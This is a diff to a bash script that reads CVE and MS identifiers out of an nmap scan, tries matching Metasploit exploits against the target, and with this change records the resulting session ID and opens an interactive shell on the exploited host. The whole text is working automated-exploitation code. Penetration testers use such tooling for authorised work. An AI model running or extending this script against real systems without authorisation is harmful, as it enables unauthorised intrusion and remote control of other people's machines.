@@ -129,6 +129,7 @@ total_vulns=$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan
 # Loop through each CVE and MS value found and search for exploits
 count=0
 exploit_executed=false
+session_id=""
 
 while read vuln
 do  
@@ -163,6 +164,7 @@ do
                     echo "Exploited vulnerability $vuln using exploit $exploit"
                     exploitsFound=1
                     exploit_executed=true
+                    session_id=$(msfconsole -x "sessions -i" | grep -oP "(\d+)" | tail -1)
                     break
                 else
                     echo "Failed to exploit vulnerability $vuln using exploit $exploit"
@@ -190,10 +192,13 @@ do
     # Check if an exploit has been successfully executed
     if [ "$exploit_executed" = true ]
     then
+        echo "Successfully exploited vulnerability $vuln. Opening shell..."
+        msfconsole -q -x "sessions -i $session_id; interact" 
         break
     fi
 
 done <<< "$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u)"
+
 
 
 
